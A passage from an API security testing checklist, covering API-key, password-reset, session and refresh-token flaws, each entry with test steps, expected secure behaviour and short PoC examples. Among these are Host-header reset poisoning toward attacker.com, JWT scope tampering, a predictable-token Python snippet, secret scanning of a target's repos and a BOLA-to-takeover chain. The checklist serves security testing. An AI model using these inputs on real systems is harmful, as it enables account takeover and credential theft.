**Expected Result:** Should alert on suspicious activity

**Payload / PoC Example:**

```
No alert on unusual usage
```

**Impact:** Weak/leaked API key grants persistent authenticated access

**Tools:** Manual

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API9:2023 Improper Inventory Management

---

## API-0139 — Master API Key Without Restrictions
**Phase:** 4-Auth: API Keys · **Category:** API Keys · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** API Key Management — API key (header/query param)

**Test Steps:** 1. Check if master/admin keys exist<br>2. Test their permissions<br>3. Verify if rotated

**Expected Result:** Should avoid master keys or heavily restrict

**Payload / PoC Example:**

```
Master key with full access never expires
```

**Impact:** Weak/leaked API key grants persistent authenticated access

**Tools:** Manual

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API5:2023 Broken Function Level Authorization

---

## API-0140 — API Key in Git Repository
**Phase:** 4-Auth: API Keys · **Category:** API Keys · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** API Key Management — API key (header/query param)

**Test Steps:** 1. Search GitHub/GitLab for org name + api_key<br>2. Use truffleHog on public repos<br>3. Test discovered keys against production

**Expected Result:** No API keys committed to version control; pre-commit hooks enforced

**Payload / PoC Example:**

```
trufflehog git https://github.com/target/repo --only-verified
```

**Impact:** Weak/leaked API key grants persistent authenticated access

**Tools:** truffleHog, gitleaks, GitDorker

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API9:2023 Improper Inventory Management

---

## API-0141 — API Key Privilege Escalation via Scope Tampering
**Phase:** 4-Auth: API Keys · **Category:** API Keys · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** API Key Management — API key (header/query param)

**Test Steps:** 1. Obtain limited-scope API key<br>2. Modify scope claim in key/JWT<br>3. Check if server validates scope or trusts client

**Expected Result:** Scopes enforced server-side; client cannot modify key permissions

**Payload / PoC Example:**

```
API-Key header + tampered body: {"scope":"admin:write"}
```

**Impact:** Weak/leaked API key grants persistent authenticated access

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API5:2023 Broken Function Level Authorization

---

## API-0142 — API Key Leakage via HTTP Referer Header
**Phase:** 4-Auth: API Keys · **Category:** API Keys · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** API key (header/query param)

**Test Steps:** 1. Identify API endpoints where key passed in URL<br>2. Check if page redirects to external (CDN, analytics)<br>3. Referer header carries API key to third party

**Expected Result:** API keys only transmitted in request headers; never in URL

**Payload / PoC Example:**

```
GET /dashboard?api_key=SECRET  (page includes external scripts)
Referer: https://target.com/dashboard?api_key=SECRET sent to cdn.example.com
```

**Impact:** Weak/leaked API key grants persistent authenticated access

**Tools:** Burp Suite, Browser DevTools

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0143 — Third-Party API Key Exposure
**Phase:** 4-Auth: API Keys · **Category:** API Keys · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** API key (header/query param)

**Test Steps:** 1. Review client-side code<br><br>2. Check for embedded API keys<br><br>3. Extract keys for external services<br><br>4. Abuse exposed credentials

**Expected Result:** Should protect all API keys

**Payload / PoC Example:**

```
Google Maps key in JavaScript
```

**Impact:** Weak/leaked API key grants persistent authenticated access

**Tools:** Manual

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0144 — API Key Privilege Scope Tampering
**Phase:** 4-Auth: API Keys · **Category:** API Keys · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST API Key Management — API key (header/query param)

**Test Steps:** 1. Obtain read-only scoped API key<br>2. Modify scope claim in JWT or header<br>3. Try sending scope=admin:write in request body<br>4. Test scope confusion via parameter pollution

**Expected Result:** Scopes enforced entirely server-side; client-provided scope values ignored

**Payload / PoC Example:**

```
# JWT scope manipulation
# Decode token, change scope claim
{"sub":"user123","scope":"read:data","exp":9999999999}
→ modify to:
{"sub":"user123","scope":"admin:write read:data write:data","exp":9999999999}

# Parameter pollution (scope override)
GET /api/data?scope=admin
Authorization: Api-Key <limited_key>

# Header injection
X-API-Scope: admin:write
X-Forwarded-Scope: full_access

# Body scope injection
POST /api/resource {"data":"value","scope":"admin","permissions":["read","write","delete"]}

# Token upgrade request
POST /api/keys/upgrade {"current_key":"KEY-ABC","requested_scope":"admin:all"}
```

**Impact:** Weak/leaked API key grants persistent authenticated access

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0145 — Predictable password reset token
**Phase:** 4-Auth: Password Reset · **Category:** Authentication · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST Password-reset flow — token/email/Host header

**Test Steps:** 1. Request reset for 10 accounts in 1 sec<br>2. Compare tokens; check for timestamp/sequential pattern<br>3. Predict and reset victim

**Expected Result:** Cryptographically random tokens

**Payload / PoC Example:**

```
resetToken=1001 1002 1003
```

**Impact:** Mass ATO

**Tools:** Burp Sequencer

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0146 — Reset token IDOR via userId override
**Phase:** 4-Auth: Password Reset · **Category:** Authentication · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST Password-reset flow — token/email/Host header

**Test Steps:** 1. Get reset link for userA<br>2. Replay with userId=victim while keeping our token<br>3. Reset victim password

**Expected Result:** Token bound to user ID server-side

**Payload / PoC Example:**

```
GET /reset?userId=2&token=mine
```

**Impact:** Single-click ATO

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API1:2023 Broken Object Level Authorization

---

## API-0147 — Host header injection redirects reset link
**Phase:** 4-Auth: Password Reset · **Category:** Authentication · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST Password-reset flow — token/email/Host header

**Test Steps:** 1. POST /forgot with Host: attacker.com<br>2. Receive email; verify link points to attacker<br>3. When victim clicks attacker captures token

**Expected Result:** Build reset URL from trusted config only

**Payload / PoC Example:**

```
Host: attacker.com
```

**Impact:** ATO via phishing-grade link

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0148 — Reset token reuse / no single-use
**Phase:** 4-Auth: Password Reset · **Category:** Authentication · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST Password-reset flow — token/email/Host header

**Test Steps:** 1. Use token successfully<br>2. Re-submit same token to reset again

**Expected Result:** Single use; invalidate on use

**Payload / PoC Example:**

```
Replay consumed token
```

**Impact:** Persistent ATO

**Tools:** Manual

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0149 — Password Reset Token in Response
**Phase:** 4-Auth: Password Reset · **Category:** Authentication · **OWASP API 2023:** API3:2023 Broken Object Property Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Login — Password-reset flow — token/email/Host header

**Test Steps:** 1. Initiate password reset<br>2. Check API response<br>3. Look for token in response body

**Expected Result:** Token should only be sent via secure channel (email)

**Payload / PoC Example:**

```
{"resetToken":"abc123", "message":"Email sent"}
```

**Impact:** Password-reset flaw yields full pre-auth account takeover

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API3:2023 Broken Object Property Level Authorization

---

## API-0150 — Password Reset Token Predictability
**Phase:** 4-Auth: Password Reset · **Category:** Authentication · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Password Reset — Password-reset flow — token/email/Host header

**Test Steps:** 1. Request password reset for multiple users<br>2. Analyze token patterns<br>3. Try to predict tokens

**Expected Result:** Tokens should be cryptographically random

**Payload / PoC Example:**

```
Sequential tokens: resetToken=1001, 1002, 1003
```

**Impact:** Password-reset flaw yields full pre-auth account takeover

**Tools:** Burp Sequencer

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0151 — Password Reset IDOR
**Phase:** 4-Auth: Password Reset · **Category:** Authentication · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Password Reset — Password-reset flow — token/email/Host header

**Test Steps:** 1. Request reset for user A<br>2. Get reset link<br>3. Change userId parameter to user B

**Expected Result:** Should validate token ownership

**Payload / PoC Example:**

```
GET /reset-password?userId=2&token=abc (token belongs to userId=1)
```

**Impact:** Password-reset flaw yields full pre-auth account takeover

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API1:2023 Broken Object Level Authorization

---

## API-0152 — Password Reset Token Expiration
**Phase:** 4-Auth: Password Reset · **Category:** Authentication · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Password Reset — Password-reset flow — token/email/Host header

**Test Steps:** 1. Request password reset<br>2. Wait for expiration time<br>3. Try using expired token

**Expected Result:** Should reject expired tokens (15-60 min validity)

**Payload / PoC Example:**

```
Use token after expiration
```

**Impact:** Password-reset flaw yields full pre-auth account takeover

**Tools:** Manual

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0153 — Password Reset Without Old Password
**Phase:** 4-Auth: Password Reset · **Category:** Authentication · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Password Reset — Password-reset flow — token/email/Host header

**Test Steps:** 1. Initiate password reset<br>2. Complete reset process<br>3. Check if old password required

**Expected Result:** Reset via email link should not need old password (but account settings should)

**Payload / PoC Example:**

```
Reset password without verification
```

**Impact:** Password-reset flaw yields full pre-auth account takeover

**Tools:** Manual

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0154 — Password Reset Token Brute Force
**Phase:** 4-Auth: Password Reset · **Category:** Authentication · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Password Reset — Password-reset flow — token/email/Host header

**Test Steps:** 1. Request password reset<br>2. Attempt to brute force token<br>3. Check rate limiting

**Expected Result:** Should limit attempts and use long random tokens

**Payload / PoC Example:**

```
Automated token guessing
```

**Impact:** Password-reset flaw yields full pre-auth account takeover

**Tools:** Burp Intruder

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API4:2023 Unrestricted Resource Consumption

---

## API-0155 — Password Reset Email Enumeration
**Phase:** 4-Auth: Password Reset · **Category:** Authentication · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Password Reset — Password-reset flow — token/email/Host header

**Test Steps:** 1. Request reset for existing email<br>2. Request for non-existing email<br>3. Compare responses

**Expected Result:** Should show same message for both

**Payload / PoC Example:**

```
Compare responses: existing vs non-existing
```

**Impact:** Password-reset flaw yields full pre-auth account takeover

**Tools:** Manual

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API5:2023 Broken Function Level Authorization

---

## API-0156 — Host Header Injection in Reset Email
**Phase:** 4-Auth: Password Reset · **Category:** Authentication · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Password Reset — Password-reset flow — token/email/Host header

**Test Steps:** 1. Request password reset<br>2. Modify Host header to attacker.com<br>3. Check if reset link uses malicious host

**Expected Result:** Should use configured domain only

**Payload / PoC Example:**

```
Host: attacker.com in request, reset link points to attacker
```

**Impact:** Password-reset flaw yields full pre-auth account takeover

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0157 — Password Reset Token Reuse
**Phase:** 4-Auth: Password Reset · **Category:** Authentication · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Password Reset — Password-reset flow — token/email/Host header

**Test Steps:** 1. Use reset token successfully<br>2. Try using same token again

**Expected Result:** Token should be single-use

**Payload / PoC Example:**

```
Reuse consumed token
```

**Impact:** Password-reset flaw yields full pre-auth account takeover

**Tools:** Manual

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0158 — Reset Password Without Rate Limit
**Phase:** 4-Auth: Password Reset · **Category:** Authentication · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Password Reset — Password-reset flow — token/email/Host header

**Test Steps:** 1. Send multiple reset requests for same email<br>2. Check if flooded with emails<br>3. Verify rate limiting

**Expected Result:** Should limit requests per email per time period

**Payload / PoC Example:**

```
Send 100 reset requests in 1 minute
```

**Impact:** Password-reset flaw yields full pre-auth account takeover

**Tools:** Burp Intruder

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API4:2023 Unrestricted Resource Consumption

---

## API-0159 — Password Reset Token in URL
**Phase:** 4-Auth: Password Reset · **Category:** Authentication · **OWASP API 2023:** API3:2023 Broken Object Property Level Authorization · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Password Reset — Password-reset flow — token/email/Host header

**Test Steps:** 1. Check if token sent in URL vs request body<br>2. Review server logs<br>3. Check browser history

**Expected Result:** Sensitive tokens should not be in URL (use POST body)

**Payload / PoC Example:**

```
GET /reset?token=secret vs POST /reset {token:secret}
```

**Impact:** Password-reset flaw yields full pre-auth account takeover

**Tools:** Manual

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API3:2023 Broken Object Property Level Authorization

---

## API-0160 — Account Takeover via Password Reset Poisoning
**Phase:** 4-Auth: Password Reset · **Category:** Authentication · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login — Password-reset flow — token/email/Host header

**Test Steps:** 1. Initiate password reset for victim<br>2. Add X-Forwarded-Host: attacker.com header<br>3. Check if reset link uses poisoned host

**Expected Result:** Reset link always uses configured base URL; ignores Host/X-Forwarded-Host

**Payload / PoC Example:**

```
POST /forgot-password  X-Forwarded-Host: attacker.com
```

**Impact:** Password-reset flaw yields full pre-auth account takeover

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0161 — Concurrent Password Reset - Race to Admin
**Phase:** 4-Auth: Password Reset · **Category:** Authentication · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Password Reset — Password-reset flow — token/email/Host header

**Test Steps:** 1. Request password reset simultaneously as admin<br>2. Use Turbo Intruder to race token generation<br>3. Check if tokens collide

**Expected Result:** Token generation is cryptographically random and isolated per request

**Payload / PoC Example:**

```
Turbo Intruder: parallel POST /reset-password for admin@target.com
```

**Impact:** Password-reset flaw yields full pre-auth account takeover

**Tools:** Turbo Intruder

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0162 — Password Reset Token Enumeration
**Phase:** 4-Auth: Password Reset · **Category:** Authentication · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** GET Password Reset — Password-reset flow — token/email/Host header

**Test Steps:** 1. Request password reset for 10 accounts<br>2. Collect all tokens from emails<br>3. Analyse entropy with Burp Sequencer<br>4. Try sequential/timestamp-based token guessing

**Expected Result:** Tokens are 256-bit cryptographically random; no timestamp or sequential component

**Payload / PoC Example:**

```
# Weak token patterns to test
GET /reset?token=1001  → try 1002, 1003
GET /reset?token=1620000001  → timestamp-based (unix epoch)
GET /reset?token=base64(user_id + timestamp)

# Burp Sequencer – token entropy analysis
Target: GET /api/reset?token=TOKEN
Collect 100+ tokens → analyse bit entropy

# Predictable token example
token = md5(email + current_timestamp)  # weak
import hashlib, time
token = hashlib.md5(f"victim@target.com{int(time.time())}".encode()).hexdigest()
```

**Impact:** Password-reset flaw yields full pre-auth account takeover

**Tools:** Burp Sequencer, Python

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0163 — CHAIN: BOLA-write -&gt; set victim email -&gt; password reset -&gt; ATO
**Phase:** 4-Auth: Password Reset · **Category:** Authentication · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** PATCH /users/{id} (email) via BOLA/BFLA write, then the password-reset flow

**Test Steps:** 1. Use a BOLA/BFLA write to set the victim account's email to yours<br>2. Trigger password reset for the victim account<br>3. Receive the reset link in your inbox<br>4. Reset and log in as the victim

**Expected Result:** Object writes re-authorize AND email change requires verification / step-up auth

**Payload / PoC Example:**

```
PATCH /api/v1/users/<victim> {"email":"me@inbox.test"}  -> POST /forgot {"email":"<victim>"}
```

**Impact:** BOLA-write -&gt; email takeover -&gt; password reset -&gt; full account takeover

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); REST_API TESTING_GUIDE §16 killer-chain ③; OWASP API1; disclosed ATO writeups; API1:2023 Broken Object Level Authorization

---

## API-0164 — Reset email bombing
**Phase:** 4-Auth: Password Reset · **Category:** DoS · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** POST High-volume / large-payload requests

**Test Steps:** 1. Send 1000 reset requests for victim email in 60s<br>2. Check rate limit per email and IP

**Expected Result:** Limit per email per hour

**Payload / PoC Example:**

```
Loop POST /forgot {email:victim}
```

**Impact:** Email/SMS bomb cost amplification

**Tools:** Burp Intruder

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API4:2023 Unrestricted Resource Consumption

---

## API-0165 — JWT not invalidated on logout
**Phase:** 5-Session · **Category:** JWT · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Login and capture JWT<br>2. POST /logout<br>3. Reuse JWT against /api/me

**Expected Result:** Server-side blocklist on logout

**Payload / PoC Example:**

```
Reuse Authorization: Bearer X
```

**Impact:** Stolen tokens remain valid

**Tools:** Burp Suite

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0166 — Cookie missing security flags
**Phase:** 5-Session · **Category:** Session Management · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** GET Session cookie / session token

**Test Steps:** 1. Inspect Set-Cookie<br>2. Check Secure / HttpOnly / SameSite / __Host- prefix<br>3. Verify domain scope

**Expected Result:** All flags set; __Host- on critical cookies

**Payload / PoC Example:**

```
Set-Cookie: session=X (no Secure no HttpOnly)
```

**Impact:** XSS or sub-domain takeover -&gt; ATO

**Tools:** DevTools,Burp

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0167 — Token Not Invalidated on Logout
**Phase:** 5-Session · **Category:** Session Management · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Logout — Session cookie / session token

**Test Steps:** 1. Login and get token<br>2. Logout<br>3. Try using old token for API calls

**Expected Result:** Token should be blacklisted/invalidated

**Payload / PoC Example:**

```
Reuse token after logout
```

**Impact:** Session fixation/hijack; persistent unauthorized access

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0168 — Session Not Destroyed Server-Side
**Phase:** 5-Session · **Category:** Session Management · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Logout — Session cookie / session token

**Test Steps:** 1. Login and get session ID<br>2. Logout<br>3. Reuse session ID

**Expected Result:** Session should be destroyed on server

**Payload / PoC Example:**

```
Reuse session ID after logout
```

**Impact:** Session fixation/hijack; persistent unauthorized access

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0169 — Logout Without Authentication
**Phase:** 5-Session · **Category:** Session Management · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Logout — Session cookie / session token

**Test Steps:** 1. Send logout request without token<br>2. Send with invalid token<br>3. Check response

**Expected Result:** Should handle gracefully without errors

**Payload / PoC Example:**

```
Send logout without Authorization header
```

**Impact:** Session fixation/hijack; persistent unauthorized access

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0170 — Logout All Devices
**Phase:** 5-Session · **Category:** Session Management · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Logout — Session cookie / session token

**Test Steps:** 1. Login from multiple devices<br>2. Logout from one with 'all devices' option<br>3. Check if all tokens invalidated

**Expected Result:** All sessions should be terminated

**Payload / PoC Example:**

```
Verify all tokens become invalid
```

**Impact:** Session fixation/hijack; persistent unauthorized access

**Tools:** Manual

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0171 — Refresh token reuse not detected
**Phase:** 5-Session · **Category:** Token Management · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST Refresh/access-token endpoint

**Test Steps:** 1. Use refresh token; receive new access+refresh<br>2. Replay original refresh token<br>3. Both should not work simultaneously

**Expected Result:** Implement refresh token families with revocation

**Payload / PoC Example:**

```
Replay old refresh after rotation
```

**Impact:** Persistent ATO from leaked refresh

**Tools:** Burp Suite

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0172 — Refresh Token Without Expiration
**Phase:** 5-Session · **Category:** Token Management · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Token Refresh — Refresh/access-token endpoint

**Test Steps:** 1. Get refresh token<br>2. Check expiration<br>3. Test if works indefinitely

**Expected Result:** Should expire refresh tokens (30-90 days)

**Payload / PoC Example:**

```
Refresh token exp: null
```

**Impact:** Token refresh/revocation flaw prolongs stolen-token validity

**Tools:** jwt_tool

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0173 — Refresh Token Not Rotated
**Phase:** 5-Session · **Category:** Token Management · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Token Refresh — Refresh/access-token endpoint

**Test Steps:** 1. Use refresh token<br>2. Get new access token<br>3. Check if refresh token changed

**Expected Result:** Should issue new refresh token on each use

**Payload / PoC Example:**

```
Same refresh token reused
```

**Impact:** Token refresh/revocation flaw prolongs stolen-token validity

**Tools:** Manual

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0174 — Refresh Token Reuse After Logout
**Phase:** 5-Session · **Category:** Token Management · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

